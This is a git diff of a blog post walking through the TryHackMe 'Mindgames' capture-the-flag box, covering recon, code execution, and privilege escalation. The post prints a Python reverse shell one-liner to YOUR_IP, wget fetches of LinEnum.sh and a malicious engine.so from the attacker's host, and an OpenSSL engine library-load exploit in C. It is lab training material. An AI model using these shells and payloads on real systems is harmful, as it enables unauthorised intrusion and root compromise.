@@ -2,12 +2,14 @@
 
 Challenge Link: [Mindgames](https://tryhackme.com/room/mindgames)
 
+![image]({{0xtaylur.github.io}}/assets/mindgames/mind.png)
+
 Mindgames is a hard rated box on TryHackMe. We're tasked with enumerating, gaining initial access,and then a somewhat tricky privilege escalation using a Library Load via OpenSSL.
 
 ## Recon
 
 There wasn't that much enumeration to do since we only found 2 ports open: 22 running ssh and 80 running a HTTP server from our NMAP scan.
-```markdown
+```
 # Nmap 7.80 scan initiated Tue Jun 16 23:26:12 2020 as: nmap -sC -sV -o nmap 10.10.91.145
 Nmap scan report for 10.10.91.145
 Host is up (0.24s latency).
@@ -26,7 +28,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 We see that port 80 is open, so I decided to run a GoBuster scan to see if I could find anything. After about 10 minutes of scanning, I figured there were no directories on the site.
-```markdown
+```
 root@kali:~/THM/mindgames# gobuster dir -u 10.10.91.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 ===============================================================
 Gobuster v3.0.1
@@ -60,7 +62,7 @@ It just prints _"Hello, World"_. Now let's see what happens when we try it with 
 ![image]({{0xtaylur.github.io}}/assets/mindgames/fibonacci.png)
 
 So it seems like it it runs the actual brainfuck progamming language. Let's see if we can try to get a reverse shell with this knowledge. I headed over to the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and used the python reverse shell code.
-```markdown
+```
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
@@ -77,12 +79,12 @@ From here, we can go back one directory and read into _user.txt_
 Let's start off with using LinEnum to see if we can look into any interesting files that we can use to start our privilege escalation. On your host machine, change into your directory where you have _LinEnum_ stored. If you do not have LinEnum you can get it [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) by using the _wget_ command.
 
 On your host machine, start a SimpleHTTPServer on port 8000 by using this command:
-```markdown
+```
 python -m SimpleHTTPServer
 ```
 
 Change into the /tmp directory on your reverse shell, we can use the _wget_ command to put LinEnum.sh on the machine so we can run it.
-```markdown
+```
 $ wget YOUR_IP:8000/LinEnum.sh
 --2020-06-17 15:36:21--  http://YOUR_IP:8000/LinEnum.sh
 Connecting to YOUR_IP:8000... connected.
@@ -101,7 +103,7 @@ After reading through LinEnum we find that _/usr/bin/openssl_ has [POSIX](https:
 ![image]({{0xtaylur.github.io}}/assets/mindgames/openssl.png)
 
 After a bit of research, I found a library load via OpenSSL using the C programming language. Create a C file named _engine.c_ and put this code block inside of it.
-```markdown
+```
 #include <unistd.h>
 
 __attribute__((constructor))
@@ -112,12 +114,12 @@ static void init() {
 ```
 
 After we have made this C file, we must compile it using this command:
-```markdown
+```
 gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -Lcrypto a.o
 ```
 
 Once compiled, set up another SimpleHTTPServer and grab the engine.so file from your host machine onto the reverse shell.
-```markdown
+```
 $ wget YOUR_IP:8000/engine.so
 --2020-06-17 15:55:53--  http://YOUR_IP:8000/engine.so
 Connecting to YOUR_IP:8000... connected.
